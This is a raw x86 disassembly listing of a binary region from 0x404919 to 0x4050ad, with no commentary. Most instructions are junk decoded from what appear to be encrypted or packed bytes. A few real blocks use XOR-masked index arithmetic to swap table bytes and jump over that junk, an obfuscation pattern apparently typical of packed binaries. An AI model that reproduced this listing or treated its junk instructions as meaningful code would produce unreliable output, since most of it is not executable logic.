  404919:	shl    BYTE PTR [ebx],1
  40491b:	push   esi
  40491c:	adc    al,BYTE PTR [esi-0x7e0d6e24]
  404922:	dec    esp
  404923:	cmp    edi,DWORD PTR [eax+0x6204b89d]
  404929:	jmp    0x54df:0x688e612
  404930:	add    dl,BYTE PTR [edx]
  404932:	sbb    BYTE PTR [eax],dl
  404934:	inc    edi
  404935:	test   ebp,esp
  404937:	adc    ebx,DWORD PTR [ecx+edi*2-0x6538ee1b]
  40493e:	lds    ebp,FWORD PTR [eax]
  404940:	push   ebx
  404941:	mov    ah,0x7d
  404943:	pop    es
  404944:	fmul   QWORD PTR [edx-0x2a]
  404947:	jae    0x4048fe
  404949:	cmc    
  40494a:	into   
  40494b:	jge    0x4048d9
  40494d:	add    BYTE PTR [eax+ebx*8+0x65d601a5],bl
  404954:	add    ah,BYTE PTR [edx]
  404956:	mov    eax,0x61ca8c92
  40495b:	lock push esi
  40495d:	retf   
  40495e:	xchg   edx,eax
  40495f:	xor    BYTE PTR [edx],dh
  404961:	std    
  404962:	dec    edx
  404963:	jle    0x404962
  404965:	lods   al,BYTE PTR ds:[esi]
  404966:	pop    ax
  404968:	inc    edx
  404969:	sbb    al,0x1d
  40496b:	cmc    
  40496c:	or     DWORD PTR [edi],eax
  40496e:	idiv   BYTE PTR [ebx]
  404970:	inc    edi
  404971:	data16 xor cl,BYTE PTR ss:[esi-0x142e5f5e]
  404979:	(bad)  
  40497a:	loopne 0x4049a5
  40497c:	icebp  
  40497d:	and    bh,BYTE PTR [edi+0x35669edf]
  404983:	mov    bh,0xb3
  404985:	fcomi  st,st(1)
  404987:	inc    ebx
  404988:	add    BYTE PTR [ebx+ebx*2+0x43defe7c],ch
  40498f:	addr16 out 0x8e,al
  404992:	mov    ebp,0xb050ba01
  404997:	adc    BYTE PTR [ecx+0x14c9d1b5],al
  40499d:	std    
  40499e:	(bad)  [edx+0x4d7de616]
  4049a4:	push   edx
  4049a5:	daa    
  4049a6:	and    BYTE PTR [ebx],dl
  4049a8:	lds    eax,FWORD PTR [edx*4-0x5af992c]
  4049af:	dec    edx
  4049b0:	xchg   edx,eax
  4049b1:	add    cl,cl
  4049b3:	hlt    
  4049b4:	mov    esi,0xffe814e3
  4049ba:	and    bh,ah
  4049bc:	push   edi
  4049bd:	cwde   
  4049be:	or     DWORD PTR [edx-0x655c1c07],edi
  4049c4:	jne    0x404990
  4049c6:	push   eax
  4049c7:	push   cs
  4049c8:	out    dx,eax
  4049c9:	and    ch,al
  4049cb:	ins    DWORD PTR es:[edi],dx
  4049cc:	push   ebx
  4049cd:	ret    0x6d61
  4049d0:	(bad)  
  4049d1:	pop    edx
  4049d2:	xchg   ebx,eax
  4049d3:	test   al,0xb3
  4049d5:	(bad)  
  4049d6:	call   0x7d5:0x95404455
  4049dd:	shl    BYTE PTR [ecx],cl
  4049df:	xchg   DWORD PTR [esi+0xa377e1a],esi
  4049e5:	jle    0x404a1a
  4049e7:	xchg   BYTE PTR [edi+eiz*4],cl
  4049ea:	or     DWORD PTR [edi],eax
  4049ec:	retf   
  4049ed:	add    eax,0x8d44d700
  4049f2:	jecxz  0x404a36
  4049f4:	mov    al,ds:0x90c011e2
  4049f9:	mov    cs,WORD PTR [edi-0x67099698]
  4049ff:	cdq    
  404a00:	sbb    eax,0x906d41fa
  404a05:	jae    0x404a4a
  404a07:	dec    edi
  404a08:	rcr    DWORD PTR [ebx+eax*2+0x2ae69120],cl
  404a0f:	sub    ebx,DWORD PTR [eax+eax*2+0x39024cc8]
  404a16:	or     eax,DWORD PTR [ebp+edx*8+0x19]
  404a1a:	cli    
  404a1b:	pop    esp
  404a1c:	inc    eax
  404a1d:	adc    dh,cl
  404a1f:	lea    ecx,[edx+edx*4+0x2cbdd806]
  404a26:	xor    al,BYTE PTR [ebp+0x59]
  404a29:	xchg   esi,eax
  404a2a:	xchg   ecx,eax
  404a2b:	mov    edx,0x25e6347d
  404a30:	repz out 0xf1,al
  404a33:	test   eax,0x3931cd1a
  404a38:	data16 sub al,0x84
  404a3b:	cmp    eax,ecx
  404a3d:	push   es
  404a3e:	xor    bl,BYTE PTR [edx-0x52]
  404a41:	dec    edx
  404a42:	fcmovnbe st,st(0)
  404a44:	mov    BYTE PTR [ecx],cl
  404a46:	cdq    
  404a47:	pusha  
  404a48:	mov    eax,0xd2a8ccc
  404a4d:	std    
  404a4e:	mov    cl,0x3d
  404a50:	clc    
  404a51:	jnp    0x404a1c
  404a53:	cs jge 0x404aa9
  404a56:	jb     0x404a99
  404a58:	hlt    
  404a59:	daa    
  404a5a:	(bad)  
  404a5c:	xchg   edi,eax
  404a5d:	(bad)  
  404a5e:	mov    esp,0xfba9ed65
  404a63:	adc    eax,0xea350d92
  404a68:	ror    BYTE PTR [edx+esi*4],cl
  404a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a6c:	fwait
  404a6d:	test   eax,0x8882add2
  404a72:	(bad)  
  404a73:	mov    al,ds:0x8c59e17c
  404a78:	nop
  404a79:	into   
  404a7a:	mov    ch,0x42
  404a7c:	mov    esp,DWORD PTR [ebp+0x48]
  404a7f:	or     bh,BYTE PTR [edi-0x1a]
  404a82:	stos   BYTE PTR es:[edi],al
  404a83:	dec    eax
  404a84:	ja     0x404ab1
  404a86:	sbb    esi,DWORD PTR [ebx-0x6a]
  404a89:	and    eax,0x7abb770
  404a8e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404a90:	sbb    eax,0xd94842d0
  404a95:	cld    
  404a96:	push   0x7
  404a98:	inc    eax
  404a99:	or     eax,DWORD PTR [ebp-0x6c72055]
  404a9f:	push   esp
  404aa0:	mov    edi,0x5532592b
  404aa5:	scas   al,BYTE PTR es:[edi]
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xf83c6a28
  404b32:	sbb    al,0x1d
  404b34:	add    DWORD PTR [edx+0x587e7e22],esp
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ae6
  404b3e:	jecxz  0x404b44
  404b40:	cmp    bl,BYTE PTR [ebx]
  404b42:	test   al,0xd6
  404b44:	leave  
  404b45:	leave  
  404b46:	push   edi
  404b47:	pop    es
  404b48:	outs   dx,BYTE PTR ds:[esi]
  404b49:	pusha  
  404b4a:	inc    edx
  404b4b:	and    DWORD PTR [eax+0x32],esi
  404b4e:	and    edi,DWORD PTR [ebp+0x3f]
  404b51:	dec    edi
  404b52:	xor    DWORD PTR [edi],esi
  404b54:	pushf  
  404b55:	cmc    
  404b56:	jb     0x404b5b
  404b58:	or     eax,DWORD PTR [eax+0x6456105c]
  404b5e:	loop   0x404b24
  404b60:	mov    eax,ds:0x500bbd40
  404b65:	scas   eax,DWORD PTR es:[edi]
  404b66:	push   cs
  404b67:	pop    ebx
  404b68:	int    0xc
  404b6a:	out    0xa8,al
  404b6c:	into   
  404b6d:	data16 jns 0x404b54
  404b70:	sbb    al,0xff
  404b72:	xchg   edx,eax
  404b73:	pop    es
  404b74:	shr    DWORD PTR ds:0x542b7940,cl
  404b7a:	in     al,0x55
  404b7c:	rcl    DWORD PTR [ecx-0x76db9d38],cl
  404b82:	cld    
  404b83:	lds    ebp,FWORD PTR [eax-0x41]
  404b86:	imul   esp,ebx,0x15
  404b89:	mov    cl,0xb4
  404b8b:	lds    edi,FWORD PTR [esi]
  404b8d:	sub    DWORD PTR [ebx-0x5b],esp
  404b90:	mov    ss,eax
  404b92:	leave  
  404b93:	adc    dh,dl
  404b95:	mov    eax,ds:0xb43e1b94
  404b9a:	fnsave [eax]
  404b9c:	ins    DWORD PTR es:[edi],dx
  404b9d:	adc    al,0x2b
  404b9f:	adc    DWORD PTR [esi-0x445f705f],esi
  404ba5:	pop    es
  404ba6:	ja     0x404bc5
  404ba8:	jle    0x404c26
  404baa:	inc    ebx
  404bab:	and    eax,0x2b0b8e5
  404bb0:	lahf   
  404bb1:	hlt    
  404bb2:	push   edi
  404bb3:	ret    0x37a7
  404bb6:	jg     0x404bd3
  404bb8:	sbb    DWORD PTR [edx+edi*4+0x5c2ab021],eax
  404bbf:	jmp    DWORD PTR [ebx]
  404bc1:	xchg   ebx,eax
  404bc2:	inc    esi
  404bc3:	xchg   edi,eax
  404bc4:	sbb    al,0x91
  404bc6:	scas   al,BYTE PTR es:[edi]
  404bc7:	aad    0x16
  404bc9:	stc    
  404bca:	into   
  404bcb:	pop    edx
  404bcc:	pop    esi
  404bcd:	pop    ds
  404bce:	mov    ds:0x3b0c2713,eax
  404bd3:	push   ecx
  404bd4:	lock mov esp,0x94e5cdf4
  404bda:	nop
  404bdb:	out    0xbb,eax
  404bdd:	sub    ch,BYTE PTR [esi]
  404bdf:	out    0x76,al
  404be1:	pop    es
  404be2:	and    DWORD PTR ds:0x698c07b6,esi
  404be8:	xchg   DWORD PTR [edi],eax
  404bea:	jmp    0x404bb8
  404bec:	add    DWORD PTR [ecx+0xd],0x65
  404bf0:	mov    bh,al
  404bf2:	mov    dh,0x70
  404bf4:	shl    BYTE PTR [ebx],cl
  404bf6:	repz mov cl,dh
  404bf9:	dec    eax
  404bfa:	jle    0x404bf8
  404bfc:	cmp    BYTE PTR [eax*8+0x7aaaa825],dh
  404c03:	xor    eax,0x69de96c3
  404c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c09:	mov    al,ds:0xba13cbea
  404c0e:	in     eax,dx
  404c0f:	inc    ecx
  404c10:	mov    ebx,0xc6bab79e
  404c15:	xor    bl,BYTE PTR [edi+0x12b3612]
  404c1b:	jg     0x404bff
  404c1d:	mov    DWORD PTR [eax],ebp
  404c1f:	pop    es
  404c20:	out    dx,eax
  404c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c22:	fcomp  QWORD PTR [ecx-0x259d0583]
  404c28:	icebp  
  404c29:	data16 mov bl,0xe2
  404c2c:	arpl   WORD PTR [eax],ax
  404c2e:	pop    ecx
  404c2f:	cmp    edx,DWORD PTR [edi-0x6788c257]
  404c35:	shl    DWORD PTR [esi+edx*4-0x70],cl
  404c39:	dec    esi
  404c3a:	sbb    eax,0x846ef93d
  404c3f:	lods   eax,DWORD PTR ds:[esi]
  404c40:	jns    0x404c81
  404c42:	push   cs
  404c43:	pop    eax
  404c44:	sbb    DWORD PTR [ebp-0x43],esp
  404c47:	lods   al,BYTE PTR ds:[esi]
  404c48:	jle    0x404bf5
  404c4a:	hlt    
  404c4b:	mov    ?,WORD PTR [ebx+0xf9cef2]
  404c51:	or     eax,0x9a4fe5e2
  404c56:	lods   al,BYTE PTR ds:[esi]
  404c57:	dec    ecx
  404c58:	test   eax,0xffb9b19c
  404c5d:	ds (bad) 
  404c5f:	aad    0xa4
  404c61:	xchg   edx,eax
  404c62:	lods   eax,DWORD PTR ds:[esi]
  404c63:	mov    ebx,0xa2b579ba
  404c68:	fldenv [edi+0xe8ca3a6]
  404c6e:	pushf  
  404c6f:	les    eax,FWORD PTR ds:0x4c7d6af1
  404c75:	or     edi,DWORD PTR [ebx]
  404c77:	adc    DWORD PTR [esi-0x36f4c094],ecx
  404c7d:	jne    0x404c55
  404c7f:	sub    ecx,DWORD PTR [ebp-0x36]
  404c82:	lods   eax,DWORD PTR ds:[esi]
  404c83:	push   0x45
  404c85:	or     BYTE PTR [ecx-0x6579586],dl
  404c8b:	call   0xed14:0xc1b2685c
  404c92:	mov    ecx,0xb42270d0
  404c97:	and    al,0x7c
  404c99:	lds    ecx,FWORD PTR [eax-0x329228d8]
  404c9f:	xchg   DWORD PTR [ecx],ecx
  404ca1:	cmp    eax,0xaf995c14
  404ca6:	cmp    bl,ch
  404ca8:	in     eax,dx
  404ca9:	popa   
  404caa:	sub    eax,0x1c0fd9b2
  404caf:	mov    ebx,ebp
  404cb1:	fimul  DWORD PTR [edx+0x78]
  404cb4:	in     eax,0x3b
  404cb6:	jge    0x404cfd
  404cb8:	aam    0x39
  404cba:	and    BYTE PTR [eax],0xac
  404cbd:	push   ds
  404cbe:	scas   eax,DWORD PTR es:[edi]
  404cbf:	inc    esi
  404cc0:	cld    
  404cc1:	xchg   ecx,eax
  404cc2:	loope  0x404cf3
  404cc4:	jbe    0x404cc2
  404cc6:	and    BYTE PTR [edx+0x97e3e09],0x46
  404ccd:	cwde   
  404cce:	hlt    
  404ccf:	arpl   ax,bx
  404cd1:	mov    ebx,0xadcd97ef
  404cd6:	outs   dx,BYTE PTR ds:[esi]
  404cd7:	mov    ch,0x6e
  404cd9:	jmp    0x296ab69b
  404cde:	rcl    DWORD PTR [eax+0x37],cl
  404ce1:	imul   bl
  404ce3:	mov    ds:0x52693efa,eax
  404ce8:	sar    BYTE PTR [edx-0x3],cl
  404ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cec:	pusha  
  404ced:	stc    
  404cee:	pop    ecx
  404cef:	imul   esi,DWORD PTR [ebx],0x3c12201f
  404cf5:	call   0x476c:0x7f896d16
  404cfc:	xlat   BYTE PTR ds:[ebx]
  404cfd:	xor    al,0x23
  404cff:	cmp    eax,0x421e782f
  404d04:	sub    ah,BYTE PTR [edi-0x11910513]
  404d0a:	push   eax
  404d0b:	push   esp
  404d0c:	sub    BYTE PTR [ecx+0x68],ah
  404d0f:	dec    esp
  404d10:	xchg   esp,eax
  404d11:	adc    al,0x29
  404d13:	cmp    BYTE PTR [edx+0x6c],dh
  404d16:	aaa    
  404d17:	mov    dh,0xc7
  404d19:	sub    bh,bl
  404d1b:	add    al,0xc4
  404d1d:	push   esi
  404d1e:	(bad)  
  404d20:	sbb    al,0x8e
  404d22:	mov    ds:0x2df197da,eax
  404d27:	sbb    BYTE PTR ds:0x84be429c,cl
  404d2d:	and    edi,DWORD PTR [ecx+0x7b2b5608]
  404d33:	and    DWORD PTR [ebp-0xd181ca0],0x4afb2e90
  404d3d:	adc    ch,BYTE PTR [eax]
  404d3f:	in     eax,0x6f
  404d41:	ja     0x404cd7
  404d43:	scas   al,BYTE PTR es:[edi]
  404d44:	mov    ecx,0x60ec5e
  404d49:	mov    eax,0x233f2d43
  404d4e:	push   0x10
  404d50:	adc    eax,0xb192f90a
  404d55:	or     ecx,eax
  404d57:	daa    
  404d58:	mov    ebx,0x9fac75c8
  404d5d:	xchg   edi,eax
  404d5e:	les    ecx,FWORD PTR [edx+0x5a]
  404d61:	sub    eax,0xb6652c0e
  404d66:	sbb    al,0xe5
  404d68:	pop    esi
  404d69:	jns    0x404d27
  404d6b:	lahf   
  404d6c:	and    BYTE PTR [ecx+0x8],cl
  404d6f:	aaa    
  404d70:	sbb    BYTE PTR [ebp-0x36],0xd2
  404d74:	out    0x2f,eax
  404d76:	adc    eax,0x51488013
  404d7b:	shr    BYTE PTR [ecx-0x24a07f06],cl
  404d81:	bound  edx,QWORD PTR [ecx]
  404d83:	cmc    
  404d84:	ins    DWORD PTR es:[edi],dx
  404d85:	jne    0x404d58
  404d87:	aas    
  404d88:	xchg   BYTE PTR [edx-0x47],bh
  404d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d8c:	dec    ebx
  404d8d:	stos   BYTE PTR es:[edi],al
  404d8e:	push   cs
  404d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d90:	xor    BYTE PTR [eax+0xf],dl
  404d93:	inc    edi
  404d94:	cmp    ch,BYTE PTR [ecx]
  404d96:	push   edi
  404d97:	or     ebx,edi
  404d99:	mov    ecx,0x408fea55
  404d9e:	daa    
  404d9f:	mov    bh,BYTE PTR ds:0x5a9ef5d2
  404da5:	mov    bh,0xc6
  404da7:	add    bl,BYTE PTR [esi+eax*2+0x41255f78]
  404dae:	cmp    BYTE PTR [ecx],0xc7
  404db1:	call   0xc806:0x88862e31
  404db8:	pop    eax
  404db9:	jnp    0x404e17
  404dbb:	xchg   esi,edx
  404dbd:	out    dx,eax
  404dbe:	dec    edx
  404dbf:	nop
  404dc0:	js     0x404ddf
  404dc2:	lahf   
  404dc3:	scas   al,BYTE PTR es:[edi]
  404dc4:	mov    gs,WORD PTR [ebx+0x3496d61a]
  404dca:	(bad)  
  404dcb:	mov    eax,0x1e40c92
  404dd0:	dec    ebx
  404dd1:	xor    DWORD PTR [edx-0x5117890d],ecx
  404dd7:	pop    esi
  404dd8:	and    al,ah
  404dda:	or     BYTE PTR [edi+0x6],al
  404ddd:	repnz out dx,eax
  404ddf:	inc    edx
  404de0:	jmp    0x7866:0x258a930c
  404de7:	dec    ecx
  404de8:	fisub  WORD PTR [ebx-0x4e]
  404deb:	ror    DWORD PTR [ecx-0x70816cf],cl
  404df1:	mov    ah,0x47
  404df3:	adc    al,0x1e
  404df5:	je     0x404e5f
  404df7:	pop    ebp
  404df8:	lods   eax,DWORD PTR ds:[esi]
  404df9:	jne    0x404df7
  404dfb:	cmp    DWORD PTR [edx+0x7b275606],edx
  404e01:	inc    esp
  404e02:	into   
  404e03:	lahf   
  404e04:	or     BYTE PTR [edx],ch
  404e06:	dec    esp
  404e07:	les    esi,FWORD PTR [ebp+0x3]
  404e0a:	mov    bl,0x9a
  404e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e0d:	push   0xfffffffb
  404e0f:	lods   eax,DWORD PTR ds:[esi]
  404e10:	leave  
  404e11:	scas   al,BYTE PTR es:[edi]
  404e12:	xchg   BYTE PTR [esi-0x846a456],ch
  404e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e19:	and    BYTE PTR [esi+0x11],bh
  404e1c:	js     0x404e0e
  404e1e:	xor    ah,BYTE PTR [ebx+0x3c208b4]
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e97
  404e5e:	xor    bl,BYTE PTR [esp+eax*4-0x74]
  404e62:	and    DWORD PTR [esi+0x7e],edi
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404df2
  404e6a:	fild   DWORD PTR [ebx-0x44]
  404e6d:	lods   eax,DWORD PTR ds:[esi]
  404e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e6f:	(bad)  
  404e71:	daa    
  404e72:	lods   al,BYTE PTR ds:[esi]
  404e73:	mov    ch,0xb2
  404e75:	or     al,0xce
  404e77:	(bad)  
  404e78:	hlt    
  404e79:	sbb    eax,0x6c6a9dba
  404e7e:	and    edi,DWORD PTR [edi-0x2a]
  404e81:	aaa    
  404e82:	bound  ecx,QWORD PTR [ebp+0x51]
  404e85:	sbb    ch,BYTE PTR [ebx]
  404e87:	jle    0x404e46
  404e89:	imul   esp,DWORD PTR [ebp+ebp*8+0x5a8d5aa5],0xffffffd5
  404e91:	gs icebp 
  404e93:	jnp    0x404e3a
  404e95:	push   es
  404e96:	fld    QWORD PTR [esi+0x7a7d8d7a]
  404e9c:	and    ah,bh
  404e9e:	mov    edx,0xa325a7e0
  404ea3:	outs   dx,BYTE PTR ds:[esi]
  404ea4:	scas   eax,DWORD PTR es:[edi]
  404ea5:	cmp    dl,ah
  404ea7:	neg    DWORD PTR [edx+0xa628c7a]
  404ead:	sub    ebp,eax
  404eaf:	sbb    edx,DWORD PTR [ebx]
  404eb1:	lds    edx,FWORD PTR [eax]
  404eb3:	pusha  
  404eb4:	mov    al,0x84
  404eb6:	mov    al,0x77
  404eb8:	mov    esp,0xd621db4
  404ebd:	das    
  404ebe:	jo     0x404ea8
  404ec0:	pop    ds
  404ec1:	test   DWORD PTR [esi],ebp
  404ec3:	data16 rcl BYTE PTR [ebp+0x25],1
  404ec7:	dec    ebx
  404ec8:	jne    0x404f37
  404eca:	enter  0x29cb,0x1b
  404ece:	dec    eax
  404ecf:	popf   
  404ed0:	pop    ebp
  404ed1:	sub    ecx,DWORD PTR [ecx-0x5dfc5b76]
  404ed7:	std    
  404ed8:	clc    
  404ed9:	sar    DWORD PTR [esp+eax*4],0xa9
  404edd:	bnd je 0x404eef
  404ee0:	mov    ds:0x8700e4f,al
  404ee5:	arpl   WORD PTR [ebx-0x40],ax
  404ee8:	mov    ebp,0xca527250
  404eed:	push   0x11
  404eef:	mov    al,ds:0xa5edc0bd
  404ef4:	sub    al,BYTE PTR [esi+0x59]
  404ef7:	outs   dx,DWORD PTR ds:[esi]
  404ef8:	mov    dl,0xb0
  404efa:	enter  0x40eb,0x2a
  404efe:	xlat   BYTE PTR ds:[ebx]
  404eff:	(bad)  [edx+0x22]
  404f02:	out    0x32,eax
  404f04:	in     eax,dx
  404f05:	stc    
  404f06:	jg     0x404ee5
  404f08:	loope  0x404ec9
  404f0a:	fst    st(5)
  404f0c:	pop    eax
  404f0d:	ret    0xf29e
  404f10:	sti    
  404f11:	xchg   edi,eax
  404f12:	adc    BYTE PTR fs:[eax],0x2e
  404f16:	cmp    al,0x96
  404f18:	cmp    DWORD PTR ds:0xec3ddcbc,edx
  404f1e:	xor    DWORD PTR [edx],ebx
  404f20:	aas    
  404f21:	push   0xde484a98
  404f26:	mov    WORD PTR [ebx+edi*1-0x77],ds
  404f2a:	sbb    ebp,DWORD PTR [ebx-0x2c]
  404f2d:	jle    0x404f86
  404f2f:	arpl   WORD PTR [eax-0x731e472d],si
  404f35:	push   es
  404f36:	sar    BYTE PTR [ebx],cl
  404f38:	pop    eax
  404f39:	clc    
  404f3a:	inc    ecx
  404f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3c:	mov    eax,ds:0x2ecb032
  404f41:	push   ss
  404f42:	(bad)  
  404f43:	test   al,0xd0
  404f45:	and    eax,0x6acf7f2c
  404f4a:	mov    edi,0xbd4e19a9
  404f4f:	or     bh,0x83
  404f52:	add    dh,BYTE PTR [eax+ebp*1]
  404f55:	xor    al,0xaa
  404f57:	add    eax,eax
  404f59:	xchg   ebp,eax
  404f5a:	outs   dx,BYTE PTR ds:[esi]
  404f5b:	dec    esp
  404f5c:	iret   
  404f5d:	in     eax,dx
  404f5e:	xchg   ecx,eax
  404f5f:	mov    al,ds:0xffb6453f
  404f64:	das    
  404f65:	adc    al,0x5e
  404f67:	mov    DWORD PTR fs:0xdf6695d9,0xb77e4d5b
  404f72:	cmp    al,0x48
  404f74:	mov    BYTE PTR [ebp-0x7fb79fb0],dl
  404f7a:	enter  0x977c,0xca
  404f7e:	movq   mm2,mm0
  404f81:	cmc    
  404f82:	(bad)  
  404f84:	daa    
  404f85:	push   0xa9e70462
  404f8a:	(bad)  
  404f8b:	cmp    DWORD PTR [ebp-0x4444abd8],edx
  404f91:	xchg   esi,eax
  404f92:	stos   DWORD PTR es:[edi],eax
  404f93:	sub    al,BYTE PTR [esi-0xe]
  404f96:	jp     0x404f8e
  404f98:	mov    bl,0x85
  404f9a:	adc    al,0xcb
  404f9c:	xchg   ecx,eax
  404f9d:	sub    bh,BYTE PTR [eax+0x6b]
  404fa0:	inc    edx
  404fa1:	(bad)
  404fa5:	scas   eax,DWORD PTR es:[di]
  404fa7:	nop
  404fa8:	dec    esp
  404fa9:	xor    dl,BYTE PTR [edx+0x5d3f48c]
  404faf:	pop    esp
  404fb0:	sub    ebp,ebp
  404fb2:	jbe    0x404f7d
  404fb4:	paddb  mm3,QWORD PTR [eax+0x50a23f6a]
  404fbb:	daa    
  404fbc:	xor    ah,bl
  404fbe:	cmp    DWORD PTR [ecx-0x43],0xaf72744a
  404fc5:	cmc    
  404fc6:	cdq    
  404fc7:	outs   dx,DWORD PTR ds:[esi]
  404fc8:	cmp    DWORD PTR [eax-0x39],edx
  404fcb:	sti    
  404fcc:	(bad)  
  404fcd:	enter  0xb2fc,0x41
  404fd1:	(bad)  
  404fd3:	loopne 0x404fbf
  404fd5:	bound  ecx,QWORD PTR [eax]
  404fd7:	not    bl
  404fd9:	mov    edi,DWORD PTR [esi]
  404fdb:	sahf   
  404fdc:	mov    esp,0xfe20e7ae
  404fe1:	(bad)  [ecx-0xd]
  404fe4:	lods   eax,DWORD PTR ds:[esi]
  404fe5:	imul   edi,DWORD PTR [eax],0x50
  404fe8:	int3   
  404fe9:	test   BYTE PTR [ebp-0x30b2afd4],al
  404fef:	dec    esi
  404ff0:	mov    eax,0xe3ae82d2
  404ff5:	mov    edi,0xfcfcad52
  404ffa:	mov    ah,BYTE PTR [ecx]
  404ffc:	mov    al,BYTE PTR [eax+0x5b]
  404fff:	mov    dh,0x80
  405001:	mov    DWORD PTR [esi-0x72],edi
  405004:	js     0x404fbc
  405006:	stos   DWORD PTR es:[edi],eax
  405007:	xor    dl,BYTE PTR [edi+0x6c]
  40500a:	(bad)  
  40500b:	jecxz  0x405089
  40500d:	jge    0x404fe8
  40500f:	nop
  405010:	(bad)  
  405011:	or     eax,0xa4afd0bf
  405016:	and    al,0xe1
  405018:	mov    cl,0x82
  40501a:	sub    edx,ebx
  40501c:	add    DWORD PTR [edi+0x71],0xd413ef38
  405023:	cmc    
  405024:	mov    esi,0x7759594c
  405029:	lds    edi,FWORD PTR [ecx-0x35]
  40502c:	jle    0x404ff1
  40502e:	out    dx,eax
  40502f:	and    BYTE PTR [edi],0xc5
  405032:	push   ebx
  405033:	pop    es
  405034:	jnp    0x404fde
  405036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405037:	xchg   ecx,eax
  405038:	arpl   WORD PTR [eax+0xa],cx
  40503b:	(bad)  
  40503c:	sub    eax,0x6e1ac3e4
  405041:	sbb    al,0x21
  405043:	inc    edx
  405044:	jle    0x40504c
  405046:	mov    esp,0xd59c81e3
  40504b:	test   al,0xe5
  40504d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40504e:	lahf   
  40504f:	sub    bh,dl
  405051:	jbe    0x405097
  405053:	in     eax,0x76
  405055:	arpl   WORD PTR [ebp-0x58],bp
  405058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405059:	clc    
  40505a:	pop    eax
  40505b:	jl     0x405051
  40505d:	jnp    0x4050c0
  40505f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405060:	mov    dl,0xbd
  405062:	push   edx
  405063:	xchg   esi,eax
  405064:	push   0x274fe28d
  405069:	popf   
  40506a:	das    
  40506b:	lahf   
  40506c:	pop    es
  40506d:	xor    bl,dl
  40506f:	mov    al,ds:0xf0d7fcf
  405074:	(bad)  
  405075:	ret    0x70f
  405078:	push   es
  405079:	gs cdq 
  40507b:	xchg   ebx,eax
  40507c:	test   DWORD PTR [eax],edi
  40507e:	lods   eax,DWORD PTR ds:[esi]
  40507f:	ss push ss
  405081:	loope  0x405099
  405083:	cmc    
  405084:	add    eax,0xb99502c1
  405089:	pop    ds
  40508a:	(bad)  
  40508b:	jp     0x2b352f46
  405091:	cmp    eax,0xb5fd556b
  405096:	aad    0xaf
  405098:	or     al,0x9d
  40509a:	(bad)
  40509e:	mov    ah,0x27
  4050a0:	out    dx,eax
  4050a1:	sub    BYTE PTR [edx-0x4c],bh
  4050a4:	mov    esi,0xe548be27
  4050a9:	int3   
  4050aa:	mov    WORD PTR [esi+ebx*1],cs
  4050ad:	jp     0x405051
